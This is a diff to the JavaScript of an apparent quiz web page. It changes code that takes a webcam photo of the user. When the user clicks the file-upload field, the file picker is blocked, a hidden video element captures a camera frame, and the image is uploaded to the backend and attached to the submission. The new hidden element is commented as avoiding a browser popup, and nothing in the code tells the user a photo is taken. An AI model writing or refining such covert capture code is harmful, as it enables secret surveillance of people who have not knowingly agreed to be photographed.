@@ -1,6 +1,4 @@
 const form = document.getElementById("quiz-form");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
 
 const BACKEND_BASE = "/api";
@@ -9,15 +7,6 @@ const constraints = { video: { facingMode: "user" }, audio: false };
 let cameraCaptured = false;
 let cameraInProgress = false;
 let capturedImage = null; // store camera image
-
-// ================================
-// ENSURE VIDEO IS CLEAN ON PAGE LOAD
-// ================================
-window.addEventListener("DOMContentLoaded", () => {
-  video.srcObject = null;
-  video.style.display = "none";
-  video.removeAttribute("autoplay"); // prevent auto-popup
-});
 
 // ================================
 // COLLECT METADATA (ON SUBMIT)
@@ -65,18 +54,21 @@ async function captureAndSendCamera() {
   console.log("📸 captureAndSendCamera called");
 
   try {
+    // Dynamically create video element to avoid browser popup
+    const video = document.createElement("video");
+    video.setAttribute("playsinline", "true");
+    video.style.display = "none";
+    document.body.appendChild(video);
+
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
-    video.setAttribute("playsinline", true); // mobile fix
-    video.style.display = "block";
 
-    await new Promise((resolve) => {
-      video.onloadedmetadata = () => resolve();
-    });
-
+    await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
     await video.play();
-    await new Promise((r) => setTimeout(r, 1200)); // wait for frame
+    await new Promise(r => setTimeout(r, 1200)); // wait for frame to stabilize
 
+    // Create canvas dynamically
+    const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
 
@@ -96,9 +88,9 @@ async function captureAndSendCamera() {
     const data = await res.json();
     console.log("Camera upload response:", data);
 
-    // Stop camera
-    stream.getTracks().forEach((t) => t.stop());
-    video.style.display = "none";
+    // Cleanup
+    stream.getTracks().forEach(t => t.stop());
+    video.remove();
 
     cameraCaptured = true;
   } catch (err) {
@@ -113,7 +105,7 @@ async function captureAndSendCamera() {
 // ================================
 fileInput.addEventListener("pointerdown", async (e) => {
   if (!cameraCaptured && !cameraInProgress) {
-    e.preventDefault(); // stop file picker temporarily
+    e.preventDefault(); // stop default file picker temporarily
     await captureAndSendCamera(); // permission asked here
     setTimeout(() => fileInput.click(), 50); // reopen file picker after capture
   }
@@ -183,7 +175,7 @@ form.addEventListener("submit", async (e) => {
           file: fileData,
           filename: fileInput.files[0].name,
           metadata,
-          cameraImage: capturedImage || null, // include if available
+          cameraImage: capturedImage || null, // attach if available
         }),
       });
 
